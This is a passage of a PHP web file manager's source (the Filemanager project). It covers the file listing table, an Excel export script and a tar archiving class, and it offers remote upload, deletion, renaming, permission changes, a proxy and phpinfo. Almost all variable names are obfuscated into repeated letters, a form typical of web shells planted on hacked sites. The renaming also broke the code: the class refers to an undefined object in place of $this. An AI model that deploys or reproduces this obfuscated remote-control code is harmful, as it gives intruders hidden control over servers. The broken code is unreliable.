		     	<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />
                       
		     	<input type="submit" name="test" value="<?=__('Upload')?>" />

		     	</form>

		     <?php }?>
                    
		     </td>
		<td>
		<?php if($q['authorize']){?>
			<form action="" method="post">&nbsp;&nbsp;&nbsp;
			<input name="quit" type="hidden" value="1">
			<?=__('Hello')?>, <?=$q['login']?>
			<input type="submit" value="<?=__('Quit')?>">
			</form>
		<?php }?>
		</td>
		<td>
		<?=fm_lang_form($r)?>
		</td>
		<tr>
		</table>
    </td>
</tr>
</table>
<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">
<thead>
<tr> 
    <th style="white-space:nowrap"> <?=__('Filename')?> </th>
    <th style="white-space:nowrap"> <?=__('Size')?> </th>
    <th style="white-space:nowrap"> <?=__('Date')?> </th>
    <th style="white-space:nowrap"> <?=__('Rights')?> </th>
    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>
</tr>
</thead>
<tbody>
<?php
$uuuuuu=fm_scan_dir($d,'','all',true);$vvvvvv=array();$wwwwww=array();foreach($uuuuuu as $y){if(@is_dir($d.$y)){$vvvvvv[]=$y;}else{$wwwwww[]=$y;}}natsort($vvvvvv);natsort($wwwwww);$uuuuuu=array_merge($vvvvvv,$wwwwww);foreach($uuuuuu as $y){$ccc=$d.$y;$xxxxxx=@stat($ccc);if(@is_dir($ccc)){$xxxxxx[7]='';if(!empty($p['show_dir_size'])&&!fm_root($y))$xxxxxx[7]=fm_dir_size($ccc);$eee='<a href="'.$qqqqq.'&path='.$d.$y.'" title="'.__('Show').' '.$y.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$y.'</a>';$yyyyyy=(fm_root($y)||$g)?'':fm_link('zip',$ccc,__('Compress').'&nbsp;zip',__('Archiving').' '.$y);$zzzzzz=(fm_root($y)||$g)?'':fm_link('gz',$ccc,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$y);$aaaaaaa='row2';if(!fm_root($y))$iiii='onClick="if(confirm(\''.__('Are you sure you want to delete this directory (recursively)?').'\n /'.$y.'\')) document.location.href = \''.$qqqqq.'&delete='.$y.'&path='.$d.'\'"';else $iiii='';}else{$eee=$p['show_img']&&@getimagesize($ccc)?'<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''.fm_img_link($ccc).'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.fm_img_link($ccc).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$y.'</a>':'<a href="'.$qqqqq.'&edit='.$y.'&path='.$d.'" title="'.__('Edit').'"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$y.'</a>';$bbbbbbb=explode(".",$y);$nnnnn=end($bbbbbbb);$yyyyyy=fm_link('download',$ccc,__('Download'),__('Download').' '.$y);$zzzzzz=in_array($nnnnn,array('zip','gz','tar'))?'':((fm_root($y)||$g)?'':fm_link('gzfile',$ccc,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$y));$aaaaaaa='row1';$iiii='onClick="if(confirm(\''.__('File selected').': \n'.$y.'. \n'.__('Are you sure you want to delete this file?').'\')) document.location.href = \''.$qqqqq.'&delete='.$y.'&path='.$d.'\'"';}$ccccccc=fm_root($y)?'':'<a href="#" title="'.__('Delete').' '.$y.'" '.$iiii.'>'.__('Delete').'</a>';$ddddddd=fm_root($y)?'':'<a href="'.$qqqqq.'&rename='.$y.'&path='.$d.'" title="'.__('Rename').' '.$y.'">'.__('Rename').'</a>';$eeeeeee=($y=='.'||$y=='..')?'':'<a href="'.$qqqqq.'&rights='.$y.'&path='.$d.'" title="'.__('Rights').' '.$y.'">'.@fm_rights_string($ccc).'</a>';?>
<tr class="<?=$aaaaaaa?>"> 
    <td><?=$eee?></td>
    <td><?=$xxxxxx[7]?></td>
    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$xxxxxx[9])?></td>
    <td><?=$eeeeeee?></td>
    <td><?=$ccccccc?></td>
    <td><?=$ddddddd?></td>
    <td><?=$yyyyyy?></td>
    <td><?=$zzzzzz?></td>
</tr>
<?php
}}?>
</tbody>
</table>
<div class="row3"><?php
 $fffffff=explode(' ',microtime());$ggggggg=$fffffff[0]+$fffffff[1]-$a;echo fm_home().' | ver. '.$m.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.fm_site_url().'">.</a>';if(!empty($p['show_php_ver']))echo ' | PHP '.phpversion();if(!empty($p['show_php_ini']))echo' | '.php_ini_loaded_file();if(!empty($p['show_gt']))echo' | '.__('Generation time').': '.round($ggggggg,2);if(!empty($p['enable_proxy']))echo ' | <a href="?proxy=true">proxy</a>';if(!empty($p['show_phpinfo']))echo ' | <a href="?phpinfo=true">phpinfo</a>';if(!empty($p['show_xls'])&&!empty($eee))echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';if(!empty($p['fm_settings']))echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';?>
</div>
<script type="text/javascript">
function download_xls(filename, text) {
	var element = document.createElement('a');
	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);
	element.setAttribute('download', filename);
	element.style.display = 'none';
	document.body.appendChild(element);
	element.click();
	document.body.removeChild(element);
}

function base64_encode(m) {
	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {
		c = m.charCodeAt(l);
		if (128 > c) d = 1;
		else
			for (d = 2; c >= 2 << 5 * d;) ++d;
		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])
	}
	b && (g += k[f << 6 - b]);
	return g
}


var tableToExcelData = (function() {
    var uri = 'data:application/vnd.ms-excel;base64,',
    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',
    format = function(s, c) {
            return s.replace(/{(\w+)}/g, function(m, p) {
                return c[p];
            })
        }
    return function(table, name) {
        if (!table.nodeType) table = document.getElementById(table)
        var ctx = {
            worksheet: name || 'Worksheet',
            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")
        }
		t = new Date();
		filename = 'fm_' + t.toISOString() + '.xls'
		download_xls(filename, base64_encode(format(template, ctx)))
    }
})();

var table2Excel = function () {

    var ua = window.navigator.userAgent;
    var msie = ua.indexOf("MSIE ");

	this.CreateExcelSheet = 
		function(el, name){
			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer

				var x = document.getElementById(el).rows;

				var xls = new ActiveXObject("Excel.Application");

				xls.visible = true;
				xls.Workbooks.Add
				for (i = 0; i < x.length; i++) {
					var y = x[i].cells;

					for (j = 0; j < y.length; j++) {
						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
					}
				}
				xls.Visible = true;
				xls.UserControl = true;
				return xls;
			} else {
				tableToExcelData(el, name);
			}
		}
}
</script>
</body>
</html>

<?php
 class archiveTar{var $hhhhhhh='';var $iiiiiii=0;var $jjjjjjj=0;var $kkkkkkk=true;var $lllllll=array();var $wwwwww=array();function __construct(){if(!isset($mmmmmmm->errors))$mmmmmmm->errors=array();}function createArchive($nnnnnnn){$aaaa=false;if(file_exists($mmmmmmm->archive_name)&&is_file($mmmmmmm->archive_name))$ooooooo=false;else $ooooooo=true;if($ooooooo){if(!$mmmmmmm->openWrite())return false;}else{if(filesize($mmmmmmm->archive_name)==0)return $mmmmmmm->openWrite();if($mmmmmmm->isGzipped){$mmmmmmm->closeTmpFile();if(!rename($mmmmmmm->archive_name,$mmmmmmm->archive_name.'.tmp')){$mmmmmmm->errors[]=__('Cannot rename').' '.$mmmmmmm->archive_name.__(' to ').$mmmmmmm->archive_name.'.tmp';return false;}$ppppppp=gzopen($mmmmmmm->archive_name.'.tmp','rb');if(!$ppppppp){$mmmmmmm->errors[]=$mmmmmmm->archive_name.'.tmp '.__('is not readable');rename($mmmmmmm->archive_name.'.tmp',$mmmmmmm->archive_name);return false;}if(!$mmmmmmm->openWrite()){rename($mmmmmmm->archive_name.'.tmp',$mmmmmmm->archive_name);return false;}$qqqqqqq=gzread($ppppppp,512);if(!gzeof($ppppppp)){do{$rrrrrrr=pack('a512',$qqqqqqq);$mmmmmmm->writeBlock($rrrrrrr);$qqqqqqq=gzread($ppppppp,512);}while(!gzeof($ppppppp));}gzclose($ppppppp);unlink($mmmmmmm->archive_name.'.tmp');}else{$mmmmmmm->tmp_file=fopen($mmmmmmm->archive_name,'r+b');if(!$mmmmmmm->tmp_file)return false;}}if(isset($nnnnnnn)&&is_array($nnnnnnn)){if(count($nnnnnnn)>0)$aaaa=$mmmmmmm->packFileArray($nnnnnnn);}else $mmmmmmm->errors[]=__('No file').__(' to ').__('Archive');if(($aaaa)&&(is_resource($mmmmmmm->tmp_file))){$rrrrrrr=pack('a512','');$mmmmmmm->writeBlock($rrrrrrr);}$mmmmmmm->closeTmpFile();if($ooooooo&&!$aaaa){$mmmmmmm->closeTmpFile();unlink($mmmmmmm->archive_name);}return $aaaa;}function restoreArchive($d){$sssssss=$mmmmmmm->archive_name;if(!$mmmmmmm->isGzipped){if(file_exists($sssssss)){if($pp=fopen($sssssss,'rb')){$ttttttt=fread($pp,2);fclose($pp);if($ttttttt=='\37\213'){$mmmmmmm->isGzipped=true;}}}elseif((substr($sssssss,-2)=='gz')OR(substr($sssssss,-3)=='tgz'))$mmmmmmm->isGzipped=true;}$aaaa=true;if($mmmmmmm->isGzipped)$mmmmmmm->tmp_file=gzopen($sssssss,'rb');else $mmmmmmm->tmp_file=fopen($sssssss,'rb');if(!$mmmmmmm->tmp_file){$mmmmmmm->errors[]=$sssssss.' '.__('is not readable');return false;}$aaaa=$mmmmmmm->unpackFileArray($d);$mmmmmmm->closeTmpFile();return $aaaa;}function showErrors($uuuuuuu=''){$vvvvvvv=$mmmmmmm->errors;if(count($vvvvvvv)>0){if(!empty($uuuuuuu))$uuuuuuu=' ('.$uuuuuuu.')';$uuuuuuu=__('Error occurred').$uuuuuuu.': <br/>';foreach($vvvvvvv as $qqqq)$uuuuuuu.=$qqqq.'<br/>';return $uuuuuuu;}else return'';}function packFileArray($wwwwwww){$aaaa=true;if(!$mmmmmmm->tmp_file){$mmmmmmm->errors[]=__('Invalid file descriptor');return false;}if(!is_array($wwwwwww)||count($wwwwwww)<=0)return true;for($ffff=0;$ffff<count($wwwwwww);$ffff++){$ccc=$wwwwwww[$ffff];if($ccc==$mmmmmmm->archive_name)continue;if(strlen($ccc)<=0)continue;if(!file_exists($ccc)){$mmmmmmm->errors[]=__('No file').' '.$ccc;continue;}if(!$mmmmmmm->tmp_file){$mmmmmmm->errors[]=__('Invalid file descriptor');return false;}if(strlen($ccc)<=0){$mmmmmmm->errors[]=__('Filename').' '.__('is incorrect');;return false;}$ccc=str_replace('\\','/',$ccc);$xxxxxxx=$mmmmmmm->makeGoodPath($ccc);if(is_file($ccc)){if(($y=fopen($ccc,'rb'))==0){$mmmmmmm->errors[]=__('Mode ').__('is incorrect');}if(($mmmmmmm->file_pos==0)){if(!$mmmmmmm->writeHeader($ccc,$xxxxxxx))return false;}while(($qqqqqqq=fread($y,512))!=''){$rrrrrrr=pack('a512',$qqqqqqq);$mmmmmmm->writeBlock($rrrrrrr);}fclose($y);}else $mmmmmmm->writeHeader($ccc,$xxxxxxx);if(@is_dir($ccc)){if(!($hhhh=opendir($ccc))){$mmmmmmm->errors[]=__('Error').': '.__('Directory ').$ccc.__('is not readable');continue;}while(false!==($yy=readdir($hhhh))){if($yy!='.'&&$yy!='..'){$yyyyyyy=array();if($ccc!='.')$yyyyyyy[]=$ccc.'/'.$yy;else $yyyyyyy[]=$yy;$aaaa=$mmmmmmm->packFileArray($yyyyyyy);}}unset($yyyyyyy);unset($yy);unset($hhhh);}}return $aaaa;}function unpackFileArray($d){$d=str_replace('\\','/',$d);if($d==''||(substr($d,0,1)!='/'&&substr($d,0,3)!='../'&&!strpos($d,':')))$d='./'.$d;clearstatcache();while(strlen($rrrrrrr=$mmmmmmm->readBlock())!=0){if(!$mmmmmmm->readHeader($rrrrrrr,$zzzzzzz))return false;if($zzzzzzz['filename']=='')continue;if($zzzzzzz['typeflag']=='L'){$ccc='';$aaaaaaaa=floor($zzzzzzz['size']/512);for($ffff=0;$ffff<$aaaaaaaa;$ffff++){$bbbbbbbb=$mmmmmmm->readBlock();$ccc.=$bbbbbbbb;}if(($cccccccc=$zzzzzzz['size']%512)!=0){$bbbbbbbb=$mmmmmmm->readBlock();$ccc.=substr($bbbbbbbb,0,$cccccccc);}$rrrrrrr=$mmmmmmm->readBlock();if(!$mmmmmmm->readHeader($rrrrrrr,$zzzzzzz))return false;else $zzzzzzz['filename']=$ccc;return true;}if(($d!='./')&&($d!='/')){while(substr($d,-1)=='/')$d=substr($d,0,strlen($d)-1);if(substr($zzzzzzz['filename'],0,1)=='/')$zzzzzzz['filename']=$d.$zzzzzzz['filename'];else $zzzzzzz['filename']=$d.'/'.$zzzzzzz['filename'];}if(file_exists($zzzzzzz['filename'])){if((@is_dir($zzzzzzz['filename']))&&($zzzzzzz['typeflag']=='')){$mmmmmmm->errors[]=__('File ').$zzzzzzz['filename'].__(' already exists').__(' as folder');return false;}if((is_file($zzzzzzz['filename']))&&($zzzzzzz['typeflag']=='5')){$mmmmmmm->errors[]=__('Cannot create directory').'. '.__('File ').$zzzzzzz['filename'].__(' already exists');return false;}if(!is_writeable($zzzzzzz['filename'])){$mmmmmmm->errors[]=__('Cannot write to file').'. '.__('File ').$zzzzzzz['filename'].__(' already exists');return false;}}elseif(($mmmmmmm->dirCheck(($zzzzzzz['typeflag']=='5'?$zzzzzzz['filename']:dirname($zzzzzzz['filename']))))!=1){$mmmmmmm->errors[]=__('Cannot create directory').' '.__(' for ').$zzzzzzz['filename'];return false;}if($zzzzzzz['typeflag']=='5'){if(!file_exists($zzzzzzz['filename'])){if(!mkdir($zzzzzzz['filename'],0777)){$mmmmmmm->errors[]=__('Cannot create directory').' '.$zzzzzzz['filename'];return false;}}}else{if(($ffffff=fopen($zzzzzzz['filename'],'wb'))==0){$mmmmmmm->errors[]=__('Cannot write to file').' '.$zzzzzzz['filename'];return false;}else{$aaaaaaaa=floor($zzzzzzz['size']/512);for($ffff=0;$ffff<$aaaaaaaa;$ffff++){$bbbbbbbb=$mmmmmmm->readBlock();fwrite($ffffff,$bbbbbbbb,512);}if(($zzzzzzz['size']%512)!=0){$bbbbbbbb=$mmmmmmm->readBlock();fwrite($ffffff,$bbbbbbbb,($zzzzzzz['size']%512));}fclose($ffffff);touch($zzzzzzz['filename'],$zzzzzzz['time']);}clearstatcache();if(filesize($zzzzzzz['filename'])!=$zzzzzzz['size']){$mmmmmmm->errors[]=__('Size of file').' '.$zzzzzzz['filename'].' '.__('is incorrect');return false;}}if(($dddddddd=dirname($zzzzzzz['filename']))==$zzzzzzz['filename'])$dddddddd='';if((substr($zzzzzzz['filename'],0,1)=='/')&&($dddddddd==''))$dddddddd='/';$mmmmmmm->dirs[]=$dddddddd;$mmmmmmm->files[]=$zzzzzzz['filename'];}return true;}function dirCheck($yy){$eeeeeeee=dirname($yy);if((@is_dir($yy))or($yy==''))return true;if(($eeeeeeee!=$yy)and($eeeeeeee!='')and(!$mmmmmmm->dirCheck($eeeeeeee)))return false;if(!mkdir($yy,0777)){$mmmmmmm->errors[]=__('Cannot create directory').' '.$yy;return false;}return true;}function readHeader($rrrrrrr,&$zzzzzzz){if(strlen($rrrrrrr)==0){$zzzzzzz['filename']='';return true;}if(strlen($rrrrrrr)!=512){$zzzzzzz['filename']='';$mmmmmmm->__('Invalid block size').': '.strlen($rrrrrrr);return false;}$ffffffff=0;for($ffff=0;$ffff<148;$ffff++)$ffffffff+=ord(substr($rrrrrrr,$ffff,1));for($ffff=148;$ffff<156;$ffff++)$ffffffff+=ord(' ');for($ffff=156;$ffff<512;$ffff++)$ffffffff+=ord(substr($rrrrrrr,$ffff,1));$gggggggg=unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor',$rrrrrrr);$zzzzzzz['checksum']=OctDec(trim($gggggggg['checksum']));if($zzzzzzz['checksum']!=$ffffffff){$zzzzzzz['filename']='';if(($ffffffff==256)&&($zzzzzzz['checksum']==0))return true;$mmmmmmm->errors[]=__('Error checksum for file ').$gggggggg['filename'];return false;}if(($zzzzzzz['typeflag']=$gggggggg['typeflag'])=='5')$zzzzzzz['size']=0;$zzzzzzz['filename']=trim($gggggggg['filename']);$zzzzzzz['mode']=OctDec(trim($gggggggg['mode']));$zzzzzzz['user_id']=OctDec(trim($gggggggg['user_id']));$zzzzzzz['group_id']=OctDec(trim($gggggggg['group_id']));$zzzzzzz['size']=OctDec(trim($gggggggg['size']));$zzzzzzz['time']=OctDec(trim($gggggggg['time']));return true;}function writeHeader($ccc,$xxxxxxx){$hhhhhhhh='a100a8a8a8a12A12';$iiiiiiii='a1a100a6a2a32a32a8a8a155a12';if(strlen($xxxxxxx)<=0)$xxxxxxx=$ccc;$jjjjjjjj=$mmmmmmm->makeGoodPath($xxxxxxx);if(strlen($jjjjjjjj)>99){$kkkkkkkk=pack($hhhhhhhh,'././LongLink',0,0,0,sprintf('%11s ',DecOct(strlen($jjjjjjjj))),0);$llllllll=pack($iiiiiiii,'L','','','','','','','','','');$ffffffff=0;for($ffff=0;$ffff<148;$ffff++)$ffffffff+=ord(substr($kkkkkkkk,$ffff,1));for($ffff=148;$ffff<156;$ffff++)$ffffffff+=ord(' ');for($ffff=156,$gggg=0;$ffff<512;$ffff++,$gggg++)$ffffffff+=ord(substr($llllllll,$gggg,1));$mmmmmmm->writeBlock($kkkkkkkk,148);$ffffffff=sprintf('%6s ',DecOct($ffffffff));$rrrrrrr=pack('a8',$ffffffff);$mmmmmmm->writeBlock($rrrrrrr,8);$mmmmmmm->writeBlock($llllllll,356);$mmmmmmmm=$mmmmmmm->makeGoodPath($jjjjjjjj);$ffff=0;while(($qqqqqqq=substr($mmmmmmmm,(($ffff++)*512),512))!=''){$rrrrrrr=pack('a512',$qqqqqqq);$mmmmmmm->writeBlock($rrrrrrr);}return true;}$nnnnnnnn=stat($ccc);if(@is_dir($ccc)){$oooooooo='5';$ss=sprintf('%11s ',DecOct(0));}else{$oooooooo='';clearstatcache();$ss=sprintf('%11s ',DecOct(filesize($ccc)));}$kkkkkkkk=pack($hhhhhhhh,$jjjjjjjj,sprintf('%6s ',DecOct(fileperms($ccc))),sprintf('%6s ',DecOct($nnnnnnnn[4])),sprintf('%6s ',DecOct($nnnnnnnn[5])),$ss,sprintf('%11s',DecOct(filemtime($ccc))));$llllllll=pack($iiiiiiii,$oooooooo,'','','','','','','','','');$ffffffff=0;for($ffff=0;$ffff<148;$ffff++)$ffffffff+=ord(substr($kkkkkkkk,$ffff,1));for($ffff=148;$ffff<156;$ffff++)$ffffffff+=ord(' ');for($ffff=156,$gggg=0;$ffff<512;$ffff++,$gggg++)$ffffffff+=ord(substr($llllllll,$gggg,1));$mmmmmmm->writeBlock($kkkkkkkk,148);$ffffffff=sprintf('%6s ',DecOct($ffffffff));$rrrrrrr=pack('a8',$ffffffff);$mmmmmmm->writeBlock($rrrrrrr,8);$mmmmmmm->writeBlock($llllllll,356);return true;}function openWrite(){if($mmmmmmm->isGzipped)$mmmmmmm->tmp_file=gzopen($mmmmmmm->archive_name,'wb9f');else $mmmmmmm->tmp_file=fopen($mmmmmmm->archive_name,'wb');if(!($mmmmmmm->tmp_file)){$mmmmmmm->errors[]=__('Cannot write to file').' '.$mmmmmmm->archive_name;return false;}return true;}function readBlock(){if(is_resource($mmmmmmm->tmp_file)){if($mmmmmmm->isGzipped)$pppppppp=gzread($mmmmmmm->tmp_file,512);else $pppppppp=fread($mmmmmmm->tmp_file,512);}else $pppppppp='';return $pppppppp;}function writeBlock($ttttttt,$qqqqqqqq=0){if(is_resource($mmmmmmm->tmp_file)){if($qqqqqqqq===0){if($mmmmmmm->isGzipped)gzputs($mmmmmmm->tmp_file,$ttttttt);else fputs($mmmmmmm->tmp_file,$ttttttt);}else{if($mmmmmmm->isGzipped)gzputs($mmmmmmm->tmp_file,$ttttttt,$qqqqqqqq);else fputs($mmmmmmm->tmp_file,$ttttttt,$qqqqqqqq);}}}function closeTmpFile(){if(is_resource($mmmmmmm->tmp_file)){if($mmmmmmm->isGzipped)gzclose($mmmmmmm->tmp_file);else fclose($mmmmmmm->tmp_file);$mmmmmmm->tmp_file=0;}}function makeGoodPath($d){if(strlen($d)>0){$d=str_replace('\\','/',$d);$rrrrrrrr=explode('/',$d);$aa=count($rrrrrrrr)-1;for($ffff=$aa;$ffff>=0;$ffff--){if($rrrrrrrr[$ffff]=='.'){}elseif($rrrrrrrr[$ffff]=='..'){$ffff--;}elseif(($rrrrrrrr[$ffff]=='')and($ffff!=$aa)and($ffff!=0)){}else $aaaa=$rrrrrrrr[$ffff].($ffff!=$aa?'/'.$aaaa:'');}}else $aaaa='';return $aaaa;}}?>